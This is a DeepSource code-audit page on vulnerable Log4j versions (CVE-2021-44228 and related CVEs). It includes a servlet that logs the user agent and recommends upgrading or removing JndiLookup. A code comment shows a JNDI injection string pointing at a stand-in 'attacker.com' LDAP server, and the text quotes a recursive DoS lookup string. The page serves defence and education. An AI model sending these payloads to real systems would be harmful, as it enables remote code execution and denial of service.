# Audit: log4j version used could lead to remote code execution
**ID:** `JAVA-A1022` | **Link:** [DeepSource](https://deepsource.com/directory/java/issues/JAVA-A1022)

![Critical](https://img.shields.io/badge/severity-critical-red)![Security](https://img.shields.io/badge/type-security-red)

The `log4j` library is a popular logging library used across the JVM ecosystem. However, if you are using a vulnerable version of Log4j (A version between `2.0` and `2.17.0`), RCE (Remote Code Execution) as well as DoS (Denial of Service) attacks are possible through abuse of Log4j's template processing algorithm.

An attacker can perform a malicious `JNDI` object lookup to chain other exploits, or induce the application to process a malicious template string resulting in a DoS attack if your code logs request data (such as a user agent header).

Update your Log4j version to `2.17.1` to mitigate these vulnerabilities.

The following vulnerabilities have been discovered as of December 19, 2021:

* The[original RCE vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2021-44228), affecting Log4j versions`2.0`and fixed incompletely in`2.15.0`.* A[DoS vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2021-45046), surfaced in version`2.15.0`and affecting all`2.x`versions before it.
This vulnerability is possible with certain non-default[pattern layouts](https://logging.apache.org/log4j/log4j-2.15.0/log4j-core/apidocs/org/apache/logging/log4j/core/layout/PatternLayout.html)that allow the attacker to initiate JNDI lookups by manipulating thread context data. This attack requires a custom pattern layout that uses an interpolation string like`$${ctx:loginId}`.It has been fixed in version`2.16.0`; message lookup and JNDI functionality is disabled by default now.* [Log4j `1.x` is partially vulnerable](https://nvd.nist.gov/vuln/detail/CVE-2021-4104)with non-default configurations that use the`JMSAppender`class. While this is of a lower severity than the other vulnerabilities found so far, version`1.x`has been deprecated since 2015and will not receive official updates (not even security fixes); consider updating to the latest`2.x`version.* Another[severe DoS vulnerability](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45105), affecting versions`2.0`to`2.16.0`. It is possible for a specially crafted self-referential lookup string ([PoC example of this](https://issues.apache.org/jira/browse/LOG4J2-3230)is`${${::-${::-$${::-j}}}}`) to cause log4j to go into an infinite recursive loop, resulting in a stack overflow.**NOTE:**This vulnerability also requires a non-default pattern layout similar to the previously mentioned DoS attack.This is fixed in version`2.17.1`.
Update your Log4j version to the latest to avoid these vulnerabilities.


## Bad Practice
Here is an example of this issue using a servlet:


```java
@WebServlet(value="/some/path", name="vulnerableServlet")
public class VulnerableServlet extends HttpServlet {

    private static final Logger logger = LogManager.getLogger(VulnerableServlet.class.getName());

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException {
        String userAgent = req.getHeader("user-agent");

        // will trigger an RCE exploit if the user agent contains a JNDI scheme url.
        // Here, the target is a malicious LDAP server.
        // For example: ${jndi:ldap://attacker.com/a}
        logger.info("Request user agent is " + userAgent);
    }
}
```
This exploit can make use of multiple RPC protocols, including LDAP, CORBA and RMI, of which LDAP is especially vulnerable due to its lack of security manager enforcement.

For an in-depth explanation of how this attack is made possible, [read this article](https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/).

On Java versions above `6u211`, `7u201`, `8u191` and `11.0.1` this vulnerability is mitigated to some extent because LDAP object instantiation is disabled through properties such as `com.sun.jndi.ldap.object.trustURLCodebase`, preventing JNDI from blindly downloading and instantiating classes from remote code ([source](https://www-cnblogs-com.translate.goog/yyhuni/p/15088134.html?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en-US)). This should not be relied on, as these properties could be changed to allow the exploit again.


## Recommended
There are a few ways to fix this issue.

* **Upgrade to Log4j 2.17.1**
Log4j's latest version, [2.17.1](https://search.maven.org/artifact/org.apache.logging.log4j/log4j/2.17.1/pom) fixes this bug.

Upgrade your Log4j dependency to this version if possible.

* **Remove the `JndiLookup` class from your application's classpath**
This vulnerability exploits Log4j's ability to interpolate JNDI lookup urls into logged strings. It is safe to do so but will not protect from certain DoS vulnerabilities mentioned above.

`JndiLookup.class` can be removed by deleting the `JndiLookup.class` file from your copy of `log4j-core.jar`:


```java
zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
```
* **Use thread lookup format specifiers such as %X or %MDC instead of context lookup strings like `$${ctx:someKey}`**
The use of lookup strings in custom pattern layouts may leave you open to DoS attacks. Use thread context map patterns (`%X`, `%MDC` or `%mdc`) to print out thread context data instead.

Note that this may need to be applied for every release of your application if you make use of fat jars in your deployment.

The best method to prevent this issue is to update to the latest version of Log4j.

